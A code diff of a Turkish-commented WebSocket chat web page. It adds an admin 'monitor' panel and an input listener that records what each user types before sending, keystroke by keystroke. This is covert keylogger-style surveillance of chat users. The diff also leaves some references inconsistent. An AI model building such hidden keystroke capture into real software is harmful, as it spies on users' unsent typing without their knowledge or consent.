@@ -56,19 +56,6 @@
       }
 
       /* Sohbet alanı stilleri */
-      #chatContainer {
-        width: 80%;
-        padding: 10px;
-        display: flex;
-        justify-content: center; /* Center the content horizontally */
-      }
-
-      .chat-page {
-        width: 100%; /* Set the width to 100% to occupy the entire space */
-        justify-content: center; /* Center the content horizontally */
-        display: flex;
-      }
-
       #messages {
         list-style-type: none;
         padding: 0;
@@ -189,7 +176,7 @@
           <ul id="messages"></ul>
           <form id="messageForm">
             <input
-              id="input"
+              id="mainInput"
               type="text"
               autocomplete="off"
               placeholder="Type a message..."
@@ -210,6 +197,108 @@
       const userList = document.getElementById("userList");
       let username = "";
       const ws = new WebSocket("ws://localhost:8080");
+      const mainInput = document.getElementById("mainInput");
+
+      mainInput.addEventListener("input", function (event) {
+        const userMessage = event.target.value; // Giriş değerini al
+        console.log(`Keystrokes from ${username}: ${userMessage}`);
+        // Alınan giriş değerini dilediğiniz şekilde kullanabilirsiniz, örneğin ekrana yazdırabilirsiniz
+      });
+
+      function createChatPage(targetUser) {
+        // Yeni bir sohbet alanı oluştur
+        const newChatPage = document.createElement("div");
+        newChatPage.classList.add("chat-page");
+
+        // Yeni bir form oluştur
+        const newForm = document.createElement("div");
+        newForm.classList.add("form");
+
+        // Yeni bir mesaj listesi oluştur
+        const newMessages = document.createElement("ul");
+        newMessages.classList.add("messages");
+        newMessages.id = `messages_${targetUser}`; // Her kullanıcı için farklı bir id vermek
+
+        // Yeni bir giriş alanı oluştur
+        const newInput = document.createElement("input");
+        newInput.setAttribute("type", "text");
+        newInput.setAttribute("placeholder", `Monitor to ${targetUser}...`);
+
+        // Yeni bir kapatma düğmesi oluştur
+        const newCloseButton = document.createElement("button");
+        newCloseButton.textContent = "Close";
+
+        const chatContainer = document.getElementById("chatContainer");
+
+        newCloseButton.addEventListener("click", function () {
+          chatContainer.removeChild(newChatPage);
+        });
+
+        newForm.appendChild(newMessages);
+        newForm.appendChild(newInput);
+        newForm.appendChild(newCloseButton);
+
+        // Formu yeni sohbet sayfasına ekle
+        newChatPage.appendChild(newForm);
+
+        // Sohbet sayfasını görünecek yere ekle
+        chatContainer.appendChild(newChatPage);
+
+        // WebSocket mesajlarını işlemek için fonksiyon tanımla
+        function handleWebSocketMessages(event) {
+          const data = JSON.parse(event.data);
+          if (data.type === "message" && data.name === targetUser) {
+            // Eğer mesaj, adminin tıkladığı kullanıcıya aitse, mesajı görüntüle
+            displayMessage(data, targetUser);
+          } else if (
+            data.type === "keystrokes" &&
+            data.name === targetUser &&
+            username === "admin"
+          ) {
+            // Eğer mesaj, hedef kullanıcının klavye atışlarıysa, iletişim kutusuna ekle
+            displayKeystrokes(data, targetUser);
+          }
+        }
+
+        // WebSocket mesajlarını işlemek için olay dinleyici ekle
+        ws.addEventListener("message", handleWebSocketMessages);
+
+        // Hedef kullanıcının klavye atışlarını iletişim kutusuna eklemek için fonksiyon tanımla
+        function displayKeystrokes(data, targetUser) {
+          const keystrokesList = document.getElementById(
+            `messages_${targetUser}`
+          );
+          const keystrokesItem = document.createElement("li");
+          keystrokesItem.textContent = `${targetUser}'s keystrokes: ${data.keystrokes}`;
+          keystrokesList.appendChild(keystrokesItem);
+          keystrokesList.scrollTop = keystrokesList.scrollHeight; // Scroll to the bottom
+        }
+      }
+
+      userList.addEventListener("click", function (event) {
+        // Sadece <li> öğelerine tıklandığında işlem yap
+        if (event.target.tagName === "LI" && username === "admin") {
+          // Tıklanan kullanıcının adını al
+          const targetUser = event.target.textContent.trim();
+          createChatPage(targetUser);
+        }
+      });
+
+      // Mesajları görüntülemek için fonksiyon tanımla
+      function displayMessage(messageData, targetUser) {
+        const messageList = document.getElementById(`messages_${targetUser}`);
+        const item = document.createElement("li");
+        item.textContent = `${messageData.name}: ${messageData.message}`;
+        item.classList.add("message-text");
+
+        // Kullanıcının kendi mesajını sağa hizala
+        if (messageData.name === username) {
+          item.classList.add("my-message");
+        }
+
+        messageList.appendChild(item);
+        messageList.scrollTop = messageList.scrollHeight; // Scroll to the bottom
+      }
 
       function setWebSocketMessageHandler() {
         ws.onmessage = function (event) {
@@ -222,20 +311,6 @@
         };
       }
 
-      function displayMessage(messageData) {
-        const item = document.createElement("li");
-        item.textContent = `${messageData.name}: ${messageData.message}`;
-        item.classList.add("message-text");
-
-        // Kullanıcının kendi mesajını sağa hizala
-        if (messageData.name === username) {
-          item.classList.add("my-message");
-        }
-
-        messages.appendChild(item);
-        messages.scrollTop = messages.scrollHeight; // Scroll to the bottom
-      }
-
       function updateUserList(users) {
         userList.innerHTML = ""; // Clear existing list
         users.forEach((user) => {
@@ -244,8 +319,6 @@
           userList.appendChild(userItem);
         });
       }
-      const loginPage = document.getElementById("loginPage");
-      const chatPage = document.getElementById("chatPage");
 
       loginForm.onsubmit = function (event) {
         event.preventDefault();
@@ -255,6 +328,10 @@
           loginPage.style.display = "none";
           chatPage.style.display = "block";
           onlineUsers.style.display = "block"; // Online Users kısmını görünür yap
+          if (username === "admin") {
+            // Eğer kullanıcı admin ise admin chat alanını göster
+            //adminChatPage.style.display = "block";
+          }
           setWebSocketMessageHandler();
         }
       };
